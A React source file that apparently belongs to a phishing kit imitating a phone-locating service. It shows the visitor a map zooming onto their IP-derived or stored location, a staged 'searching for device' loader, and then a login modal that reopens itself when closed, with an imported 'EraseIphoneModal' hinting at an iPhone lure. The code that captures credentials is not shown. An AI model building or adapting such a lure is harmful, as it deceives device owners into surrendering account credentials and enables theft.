import React, { useRef, useEffect, useState } from 'react';
import '../assets/css/maps.css';
import phonepc from '../assets/img/phone-pc.png';
import imap from '../assets/img/imap.png';
import ModalAuth from './auth/ModalAuth';
import EraseIphoneModal from './EraseIphoneModal';
import { useData } from '../../context/UserContext';
const style = {
    width: '100%',
    height: '100vh',
    zIndex: -100,
    position: 'fixed',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0
};

const Map = ({
    translator
}) => {

    const { user } = useData();
    const mapRef = useRef(null);
    const markerRef = useRef(null);
    const [showEraseModal, setShowEraseModal] = useState(true); // Mostrar EraseIphoneModal al inicio
    const [showModal, setShowModal] = useState(false);
    const [loading, setLoading] = useState(false);

    const handleClose = () => setShowEraseModal(false);
    const handleAutoReopen = () => setShowModal(true);

    let lat = 0;
    let lon = 0;

    // 1. Extraemos y limpiamos los valores del usuario (DB)
    // Usamos .trim() por si vienen con espacios accidentales
    const latDB = user?.data?.latitude?.toString().trim();
    const lonDB = user?.data?.longitude?.toString().trim();

    // 2. Condición: Si AMBOS existen y NO están vacíos
    if (latDB && lonDB) {
        lat = parseFloat(latDB);
        lon = parseFloat(lonDB);
    }
    // 3. Si falta alguno, usamos los datos de la red (geoLocation)
    else {
        // Usamos el objeto que recibiste de la API ip.guide
        lat = user?.location?.latitude || 0;
        lon = user?.location?.longitude || 0;
    }

useEffect(() => {
    if (showEraseModal) {
        setLoading(true);

        const mapInstance = L.map("maps").setView([lat, lon], 5);

        const tileLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=m&x={x}&y={y}&z={z}', {
            maxZoom: 20,
            subdomains: ['mt0', 'mt1', 'mt2', 'mt3']
        }).addTo(mapInstance);

        const marker = L.marker([lat, lon]).addTo(mapInstance)
            .bindPopup(
                `<img src="${phonepc}" alt='phone-pc' class='img-fluid' style='width: 50px; height: auto;'>`,
                { className: 'custom-popup' }
            );

        markerRef.current = marker;
        mapRef.current = mapInstance;

        mapInstance.once('moveend', () => {
            marker.openPopup();
            setTimeout(() => {
                setShowModal(true);
            }, 500); 
        });

        // --- MANEJO DE TIEMPOS REFINADO ---
        
        // 1. Esperamos 1.5 segundos (por ejemplo) antes de quitar el Loading
        setTimeout(() => {
            setLoading(false); 

            // 2. Esperamos otros 500ms adicionales después de quitar el Loading para empezar el Zoom
            setTimeout(() => {
                mapInstance.flyTo([lat, lon], 17, {
                    animate: true,
                    duration: 8, // Zoom lento
                    easeLinearity: 0.25
                });
            }, 500); // <-- Pausa breve entre el fin del loading y el inicio del zoom

        }, 1500); // <-- Duración total del estado de carga inicial

        return () => {
            mapInstance.off('moveend');
            mapInstance.remove();
        };
    }
}, [showEraseModal, lat, lon]);
    return (
        <>
            {/* Mostrar solo el modal al inicio */}
            {/*<EraseIphoneModal
                show={showEraseModal}
                onClose={handleClose}
                onNext={handleClose}
                deviceName={deviceName}
                translator={translator}
            />]*/}
            {/* Solo mostrar el mapa y spinner después de cerrar el modal */}
            {/*  {!showEraseModal && (*/}
            {showEraseModal && (
                <>
                    <div
                        id="maps"
                        style={{
                            ...style,
                            filter: (loading || showModal) ? 'blur(3px) grayscale(0.7) brightness(0.8)' : 'none',
                            transition: 'filter 0.5s'
                        }}
                    ></div>
                    {loading && (
                        <div
                            style={{
                                position: 'fixed',
                                top: 0,
                                left: 0,
                                width: '100vw',
                                height: '100vh',
                                background: 'rgba(255,255,255,0.7)',
                                zIndex: 1000,
                                display: 'flex',
                                flexDirection: 'column',
                                alignItems: 'center',
                                justifyContent: 'center'
                            }}
                        >
                            <div className="spinner" style={{
                                border: '8px solid #f3f3f3',
                                borderTop: '8px solid #3498db',
                                borderRadius: '50%',
                                width: '60px',
                                height: '60px',
                                animation: 'spin 1s linear infinite',
                                marginBottom: '20px'
                            }} />
                            <div style={{ fontSize: '1.3rem', color: '#333', fontWeight: 600 }}>
                                {translator("Buscando dispositivo")} ...
                            </div>
                            <style>
                                {`
                                @keyframes spin {
                                    0% { transform: rotate(0deg); }
                                    100% { transform: rotate(360deg); }
                                }
                                `}
                            </style>
                        </div>
                    )}
                    <ModalAuth
                        translator={translator}
                        show={showModal}
                        handleClose={() => setShowModal(false)}
                        onAutoReopen={handleAutoReopen}
                    />
                    <div
                        id="bac"
                        className="buttons-holder"
                        style={{
                            height: '100px',
                            width: '100px',
                            position: 'absolute',
                            left: '47%',
                            display: 'none',
                            top: '15%',
                            opacity: '1',
                        }}
                    >*
                        <img src={phonepc} style={{ width: '46px' }} alt="phone-pc" id='imgBac' />
                    </div>
                </>
            )}
        </>
    );
};

export default Map;